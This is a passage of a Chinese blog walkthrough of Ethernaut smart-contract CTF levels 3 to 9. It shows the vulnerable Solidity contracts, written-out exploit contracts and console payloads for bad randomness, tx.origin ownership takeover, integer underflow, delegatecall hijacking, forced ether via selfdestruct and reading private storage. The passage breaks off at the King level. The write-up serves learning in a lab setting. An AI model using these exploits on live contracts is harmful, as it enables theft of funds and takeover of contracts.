<h3 id="具体步骤-2"><a href="#具体步骤-2" class="headerlink" title="具体步骤"></a>具体步骤</h3><p>1.编写exp合约<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line">  uint256 public consecutiveWins;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 FACTOR = <span class="number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;</span><br><span class="line"></span><br><span class="line">  function CoinFlip() public &#123;</span><br><span class="line">    consecutiveWins = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">    uint256 blockValue = uint256(block.blockhash(block.number<span class="number">-1</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lastHash == blockValue) &#123;</span><br><span class="line">      revert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastHash = blockValue;</span><br><span class="line">    uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">    bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (side == _guess) &#123;</span><br><span class="line">      consecutiveWins++;</span><br><span class="line">      <span class="keyword">return</span> true;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      consecutiveWins = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract exp&#123;</span><br><span class="line">  CoinFlip C;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 FACTOR = <span class="number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span></span><br><span class="line"></span><br><span class="line">  function setCoinflip(address _addr) public &#123;</span><br><span class="line">    C = CoinFlip(_addr);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function hack() public OwnerOnly &#123;</span><br><span class="line">    uint256 blockValue = uint256(block.blockhash(block.number<span class="number">-1</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lastHash == blockValue) &#123;</span><br><span class="line">      revert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastHash = blockValue;</span><br><span class="line">    uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">    bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">    C.flip(side);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>2.部署在remix上并运行<code>hack</code>方法十次</p>
<div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/22.jpg" alt="22"></div>

<p>3.通过命令<code>contract.consecutiveWins()</code>可查询猜对的次数</p>
<div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/23.jpg" alt="23"></div>

<p>4.当猜对的次数为10次以上之后，点击<code>submit instance</code>即可过关。</p>
<h3 id="通关后的彩蛋-3"><a href="#通关后的彩蛋-3" class="headerlink" title="通关后的彩蛋"></a>通关后的彩蛋</h3><blockquote>
<p>Generating random numbers in solidity can be tricky. There currently isn’t a native way to generate them, and everything you use in smart contracts is publicly visible, including the local variables and state variables marked as private. Miners also have control over things like blockhashes, timestamps, and whether to include certain transactions - which allows them to bias these values in their favor.</p>
<p>Some options include using Bitcoin block headers (verified through <a href="http://btcrelay.org/" target="_blank" rel="noopener">BTC Relay</a>), <a href="https://github.com/randao/randao" target="_blank" rel="noopener">RANDAO</a>, or <a href="http://www.oraclize.it/" target="_blank" rel="noopener">Oraclize</a>).</p>
</blockquote>
<hr>
<h2 id="level-4-Telephone"><a href="#level-4-Telephone" class="headerlink" title="level 4- Telephone"></a>level 4- Telephone</h2><p><a href="https://ethernaut.zeppelin.solutions/level/0x6b7b4a5260b67c1ee9196a42dd1ed8633231ba0a" target="_blank" rel="noopener">题目链接</a></p>
<h3 id="胜利条件-3"><a href="#胜利条件-3" class="headerlink" title="胜利条件"></a>胜利条件</h3><p>1.获得合约的所有权</p>
<h3 id="tips-2"><a href="#tips-2" class="headerlink" title="tips"></a>tips</h3><p>1.<code>See the Help page above, section &quot;Beyond the console&quot;</code>,这一节主要就是教你可以使用<code>Remix</code>和<code>Truffle</code>进行合约编写和attack，也就是我们所说的写exp并运行。</p>
<h3 id="源码-3"><a href="#源码-3" class="headerlink" title="源码"></a>源码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract Telephone &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  function Telephone() public &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function changeOwner(address _owner) public &#123; //如果消息发送者不是owner就将owner转移给_owner</span><br><span class="line">    <span class="keyword">if</span> (tx.origin != msg.sender) &#123;</span><br><span class="line">      owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="预备知识-2"><a href="#预备知识-2" class="headerlink" title="预备知识"></a>预备知识</h3><p>1.tx.origin 全局变量，也就是合约的owner</p>
<h3 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h3><p>1.我们可以编写代码调用<code>changeOwner</code>，传入我们的地址，就可以变成合约<code>owner</code>了</p>
<h3 id="具体步骤-3"><a href="#具体步骤-3" class="headerlink" title="具体步骤"></a>具体步骤</h3><p>1.编写exp合约<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract Telephone &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  function Telephone() public &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function changeOwner(address _owner) public &#123; //如果消息发送者不是owner就将owner转移给_owner</span><br><span class="line">    <span class="keyword">if</span> (tx.origin != msg.sender) &#123;</span><br><span class="line">      owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract exp&#123;</span><br><span class="line">    Telephone tel;</span><br><span class="line">    function setAttackAddr(address _addr)&#123;</span><br><span class="line">        tel = Telephone(_addr);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function attack(address _addr)&#123;</span><br><span class="line">        tel.changeOwner(_addr);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>2.获取合约地址和我们自己的用户地址，并查询合约拥有者</p>
<div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/25.jpg" alt="25"></div>

<p>3.进行攻击</p>
<div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/26.jpg" alt="26"></div>

<p>4.再次查询合约拥有者，发现变成了我们，攻击完毕</p>
<div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/27.jpg" alt="27"></div>

<p>5.点击<code>submit instance</code>即可过关。</p>
<h3 id="通关后的彩蛋-4"><a href="#通关后的彩蛋-4" class="headerlink" title="通关后的彩蛋"></a>通关后的彩蛋</h3><blockquote>
<p>While this example may be simple, confusing <code>tx.origin</code> with <code>msg.sender</code> can lead to phishing-style attacks, such as <a href="https://blog.ethereum.org/2016/06/24/security-alert-smart-contract-wallets-created-in-frontier-are-vulnerable-to-phishing-attacks/" target="_blank" rel="noopener">this</a>.<br>An example of a possible attack is outlined below.<br>1.Use <code>tx.origin</code> to determine whose tokens to transfer, e.g.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; function transfer(address _to, uint _value) &#123;</span><br><span class="line">&gt;   tokens[tx.origin] -= _value;</span><br><span class="line">&gt;   tokens[_to] += _value;</span><br><span class="line">&gt; &#125;</span><br></pre></td></tr></table></figure></p>
</blockquote>
<blockquote>
<p>2.Attacker gets victim to send funds to a malicious contract that calls the transfer function of the token contract, e.g.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; function () payable &#123;</span><br><span class="line">&gt;   token.transfer(attackerAddress, 10000);</span><br><span class="line">&gt; &#125;</span><br></pre></td></tr></table></figure></p>
</blockquote>
<blockquote>
<p>In this scenario, <code>tx.origin</code> will be the victim’s address (while <code>msg.sender</code> will be the malicious contract’s address), resulting in the funds being transferred from the victim to the attacker.</p>
</blockquote>
<hr>
<h2 id="level-5-Token"><a href="#level-5-Token" class="headerlink" title="level 5- Token"></a>level 5- Token</h2><p><a href="https://ethernaut.zeppelin.solutions/level/0x6545df87f57d21cb096a0bfcc53a70464d062512" target="_blank" rel="noopener">题目链接</a></p>
<h3 id="胜利条件-4"><a href="#胜利条件-4" class="headerlink" title="胜利条件"></a>胜利条件</h3><p>1.攻击Token代币合约<br>2.开始时会获取20个代币，我们需要获得额外的、大量的代币</p>
<h3 id="tips-3"><a href="#tips-3" class="headerlink" title="tips"></a>tips</h3><p>1.<code>odometer</code></p>
<h3 id="源码-4"><a href="#源码-4" class="headerlink" title="源码"></a>源码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; uint) balances;</span><br><span class="line">  uint public totalSupply;</span><br><span class="line"></span><br><span class="line">  function Token(uint _initialSupply) public &#123; //初始化代币给owner</span><br><span class="line">    balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function transfer(address _to, uint _value) public returns (bool) &#123; //将msg.sender的value个代币转给_to，并且msg.sender-value的值大于<span class="number">0</span></span><br><span class="line">    require(balances[msg.sender] - _value &gt;= <span class="number">0</span>);</span><br><span class="line">    balances[msg.sender] -= _value;</span><br><span class="line">    balances[_to] += _value;</span><br><span class="line">    <span class="keyword">return</span> true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _owner) public view returns (uint balance) &#123; //查询代币数量</span><br><span class="line">    <span class="keyword">return</span> balances[_owner];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h3><p>1.从<code>transfer</code>函数可以看出是很明显的整数溢出漏洞，转给别的地址大于20个代币即可</p>
<h3 id="具体步骤-4"><a href="#具体步骤-4" class="headerlink" title="具体步骤"></a>具体步骤</h3><p>1.初始化信息</p>
<div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/29.jpg" alt="29"></div>

<p>2.进行转账操作，随便填一个地址，然后查询我们和转账地址的代币数，发现已经溢出</p>
<div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/30.jpg" alt="30"></div>

<p>3.点击<code>submit instance</code>即可过关。</p>
<h3 id="通关后的彩蛋-5"><a href="#通关后的彩蛋-5" class="headerlink" title="通关后的彩蛋"></a>通关后的彩蛋</h3><blockquote>
<p>Overflows are very common in solidity and must be checked for with control statements such as:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; if(a + c &gt; a) &#123;</span><br><span class="line">&gt;   a = a + c;</span><br><span class="line">&gt; &#125;</span><br></pre></td></tr></table></figure></p>
</blockquote>
<blockquote>
<p>An easier alternative is to use OpenZeppelin’s SafeMath library that automatically checks for overflows in all the mathematical operators. The resulting code looks like this:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; a = a.add(c);</span><br></pre></td></tr></table></figure></p>
</blockquote>
<blockquote>
<p>If there is an overflow, the code will revert.</p>
</blockquote>
<hr>
<h2 id="level-6-Delegation"><a href="#level-6-Delegation" class="headerlink" title="level 6- Delegation"></a>level 6- Delegation</h2><p><a href="https://ethernaut.zeppelin.solutions/level/0x68756ad5e1039e4f3b895cfaa16a3a79a5a73c59" target="_blank" rel="noopener">题目链接</a></p>
<h3 id="胜利条件-5"><a href="#胜利条件-5" class="headerlink" title="胜利条件"></a>胜利条件</h3><p>1.获得合约的所有权</p>
<h3 id="tips-4"><a href="#tips-4" class="headerlink" title="tips"></a>tips</h3><p>1.查看Solidity文档中关于<code>delegatecall low level function</code>的内容<br>2.<code>Fallback</code>方法<br>3.<code>Method ids</code></p>
<h3 id="源码-5"><a href="#源码-5" class="headerlink" title="源码"></a>源码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract Delegate &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  function Delegate(address _owner) public &#123;</span><br><span class="line">    owner = _owner;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function pwn() public &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Delegation &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line">  Delegate delegate;</span><br><span class="line"></span><br><span class="line">  function Delegation(address _delegateAddress) public &#123; //初始化</span><br><span class="line">    delegate = Delegate(_delegateAddress);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function() public &#123; //FallBack函数</span><br><span class="line">    <span class="keyword">if</span>(delegate.delegatecall(msg.data)) &#123; //执行参数为data的delegatecall</span><br><span class="line">      this;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="预备知识-3"><a href="#预备知识-3" class="headerlink" title="预备知识"></a>预备知识</h3><p>1.delegatecall<br>简单来说就是<code>delegatecall</code>执行别的合约的方法的时候的作用域是调用合约的环境。比如别的合约的方法修改了它的第一个参数b，调用合约通过<code>delegatecall</code>调用该方法时，会把调用合约的第一个参数给修改掉(并且哪怕名字不一样也可以)<br>具体内容可以参考这篇文章，写的挺详细的<br><a href="https://blog.csdn.net/fly_hps/article/details/81218219" target="_blank" rel="noopener">链接</a></p>
<h3 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h3><p>1.首先我们的目的是通过<code>delegatecall</code>来执行<code>Delegate</code>合约中的<code>pwn</code>方法，进而通过<code>delegatecall</code>的漏洞来改变<code>Delegation</code>合约的<code>owner</code>，也就是改成我们。<br>2.为了执行<code>delegatecall</code>，我们需要执行<code>fallback</code>函数，传入的data参数应该为<code>pwn()</code>的函数id，即其函数签名的sha3的前4个bytes(也就是4*2+2(0x)=10位)</p>
<h3 id="具体步骤-5"><a href="#具体步骤-5" class="headerlink" title="具体步骤"></a>具体步骤</h3><p>1.初始化实例并查看合约的<code>owner</code></p>
<div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/32.jpg" alt="32"></div>

<p>2.构造exp并执行<code>contract.sendTransaction({data:web3.sha3(&quot;pwn()&quot;).slice(0,10)})</code>.完毕之后查看<code>owner</code>，发现已经变成我们</p>
<div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/33.jpg" alt="33"></div>

<p>3.点击<code>submit instance</code>即可过关。</p>
<h3 id="通关后的彩蛋-6"><a href="#通关后的彩蛋-6" class="headerlink" title="通关后的彩蛋"></a>通关后的彩蛋</h3><blockquote>
<p>Usage of <code>delegatecall</code> is particularly risky and has been used as an attack vector on multiple historic hacks. With it, your contract is practically saying “here, -other contract- or -other library-, do whatever you want with my state”. Delegates have complete access to your contract’s state. The <code>delegatecall</code> function is a powerful feature, but a dangerous one, and must be used with extreme care.</p>
<p>Please refer to the <a href="https://blog.zeppelin.solutions/on-the-parity-wallet-multisig-hack-405a8c12e8f7?gi=abf66bfa34b0" target="_blank" rel="noopener">The Parity Wallet Hack Explained</a> article for an accurate explanation of how this idea was used to steal 30M USD.</p>
</blockquote>
<hr>
<h2 id="level-7-Force"><a href="#level-7-Force" class="headerlink" title="level 7- Force"></a>level 7- Force</h2><p><a href="https://ethernaut.zeppelin.solutions/level/0x24d661beb31b85a7d775272d7841f80e662c283b" target="_blank" rel="noopener">题目链接</a></p>
<h3 id="胜利条件-6"><a href="#胜利条件-6" class="headerlink" title="胜利条件"></a>胜利条件</h3><p>1.让合约的<code>balance&gt;0</code></p>
<h3 id="tips-5"><a href="#tips-5" class="headerlink" title="tips"></a>tips</h3><p>1.<code>Fallback</code>方法<br>2.用其他合约去攻击这个合约<br>3.用<code>Remix</code>或<code>Truffle</code></p>
<h3 id="源码-6"><a href="#源码-6" class="headerlink" title="源码"></a>源码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract Force &#123;/*</span><br><span class="line"></span><br><span class="line">                   MEOW ?</span><br><span class="line">         /\_/\   /</span><br><span class="line">    ____/ o o \</span><br><span class="line">  /~____  =ø= /</span><br><span class="line"> (______)__m_m)</span><br><span class="line"></span><br><span class="line">*/&#125;</span><br></pre></td></tr></table></figure>
<h3 id="预备知识-4"><a href="#预备知识-4" class="headerlink" title="预备知识"></a>预备知识</h3><p>1.<code>selfdestruct</code>函数(析构函数)<br><code>selfdestruct(address)</code>会将当前合约的余额发送至<code>address</code>。</p>
<p>2.没有<code>fallback</code>函数如何往合约里打钱？<br>当合约没有实现<code>payable fallback</code>函数的时候，依然有两种方法给合约里打钱<br>&nbsp;&nbsp;&nbsp;&nbsp;a.将合约作为挖矿地址挖矿<br>&nbsp;&nbsp;&nbsp;&nbsp;b.调用其他合约的析构函数<code>selfdestruct</code>并将此合约的地址作为参数</p>
<h3 id="解题思路-6"><a href="#解题思路-6" class="headerlink" title="解题思路"></a>解题思路</h3><p>1.我们自己编写一个合约并约束一个方法为<code>payable</code>，并通过该方法向此合约中打钱。<br>2.调用此合约的<code>selfdestruct</code>函数，将目标合约地址作为参数传入。这样此合约的剩下的钱就会被转移过去。</p>
<h3 id="具体步骤-6"><a href="#具体步骤-6" class="headerlink" title="具体步骤"></a>具体步骤</h3><p>1.编写exp合约<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">contract exp&#123;</span><br><span class="line">    address attackAddr;</span><br><span class="line">    function init(address _addr) public payable&#123;</span><br><span class="line">        attackAddr=_addr;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function attack()&#123;</span><br><span class="line">        selfdestruct(attackAddr);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>2.先调用<code>init</code>函数设置攻击合约的地址，并附加上一定数额的ETH</p>
<div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/34.jpg" alt="34"></div>

<p>3.再调用<code>attack</code>函数进行转钱</p>
<p>3.点击<code>submit instance</code>即可过关。</p>
<h3 id="通关后的彩蛋-7"><a href="#通关后的彩蛋-7" class="headerlink" title="通关后的彩蛋"></a>通关后的彩蛋</h3><blockquote>
<p>In solidity, for a contract to be able to receive ether, the fallback function must be marked ‘payable’.<br>However, there is no way to stop an attacker from sending ether to a contract by self destroying. Hence, it is important not to count on the invariant <code>this.balance == 0</code> for any contract logic.</p>
</blockquote>
<hr>
<h2 id="level-8-Vault"><a href="#level-8-Vault" class="headerlink" title="level 8- Vault"></a>level 8- Vault</h2><p><a href="https://ethernaut.zeppelin.solutions/level/0xe77b0bea3f019b1df2c9663c823a2ae65afb6a5f" target="_blank" rel="noopener">题目链接</a></p>
<h3 id="胜利条件-7"><a href="#胜利条件-7" class="headerlink" title="胜利条件"></a>胜利条件</h3><p>1.获得<code>password</code>并调用<code>unlock</code>函数使得<code>locked</code>参数变为<code>false</code></p>
<h3 id="源码-7"><a href="#源码-7" class="headerlink" title="源码"></a>源码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract Vault &#123;</span><br><span class="line">  bool public locked;</span><br><span class="line">  bytes32 private password;</span><br><span class="line"></span><br><span class="line">  function Vault(bytes32 _password) public &#123;</span><br><span class="line">    locked = true;</span><br><span class="line">    password = _password;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function unlock(bytes32 _password) public &#123;</span><br><span class="line">    <span class="keyword">if</span> (password == _password) &#123;</span><br><span class="line">      locked = false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="预备知识-5"><a href="#预备知识-5" class="headerlink" title="预备知识"></a>预备知识</h3><p>1.在区块链上所有的块以及信息都是公开的，所以即使合约中使用了<code>private</code>，该信息依然是公开的，可以随时被别人查看。</p>
<h3 id="解题思路-7"><a href="#解题思路-7" class="headerlink" title="解题思路"></a>解题思路</h3><p>1.通过读取区块链上的块中的信息获取<code>password</code><br>2.用该<code>password</code>作为参数调用<code>unlock</code>函数进行解锁</p>
<h3 id="具体步骤-7"><a href="#具体步骤-7" class="headerlink" title="具体步骤"></a>具体步骤</h3><p>1.通过<code>web3.eth.getStorageAt(contract.address,1,(e,v)=&gt;alert(web3.toAscii(v)))</code>指令查看<code>password</code></p>
<div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/35.jpg" alt="35"></div>

<p>2.将<code>password</code>传入<code>unlock</code>函数</p>
<div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/36.jpg" alt="36"></div>

<p>3.点击<code>submit instance</code>即可过关。</p>
<h3 id="通关后的彩蛋-8"><a href="#通关后的彩蛋-8" class="headerlink" title="通关后的彩蛋"></a>通关后的彩蛋</h3><blockquote>
<p>It’s important to remember that marking a variable as private only prevents other contracts from accessing it. State variables marked as private and local variables are still publicly accessible.<br>To ensure that data is private, it needs to be encrypted before being put onto the blockchain. In this scenario, the decryption key should never be sent on-chain, as it will then be visible to anyone who looks for it. <a href="https://blog.ethereum.org/2016/12/05/zksnarks-in-a-nutshell/" target="_blank" rel="noopener">zk-SNARKs</a> provide a way to determine whether someone possesses a secret parameter, without ever having to reveal the parameter.</p>
</blockquote>
<hr>
<h2 id="level-9-King"><a href="#level-9-King" class="headerlink" title="level 9- King"></a>level 9- King</h2><p><a href="https://ethernaut.zeppelin.solutions/level/0x32d25a51c4690960f1d18fadfa98111f71de5fa7" target="_blank" rel="noopener">题目链接</a></p>
<h3 id="胜利条件-8"><a href="#胜利条件-8" class="headerlink" title="胜利条件"></a>胜利条件</h3><p>1.你可以通过打钱成为新的King，当然前提是你的前比上一个King的钱多<br>2.当你点击<code>Submit</code>的时候合约会重新变为King，你要想办法去保持King位</p>
<h3 id="源码-8"><a href="#源码-8" class="headerlink" title="源码"></a>源码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">'zeppelin-solidity/contracts/ownership/Ownable.sol'</span>;</span><br><span class="line"></span><br><span class="line">contract King <span class="keyword">is</span> Ownable &#123;</span><br><span class="line"></span><br><span class="line">  address public king;</span><br><span class="line">  uint public prize;</span><br><span class="line"></span><br><span class="line">  function King() public payable &#123;</span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function() external payable &#123; //打更多的钱或者合约owner都可以调用此方法变为king</span><br><span class="line">    require(msg.value &gt;= prize || msg.sender == owner);</span><br><span class="line">    king.transfer(msg.value);</span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="预备知识-6"><a href="#预备知识-6" class="headerlink" title="预备知识"></a>预备知识</h3><p>1.Solidity 中几种转币方式。</p>
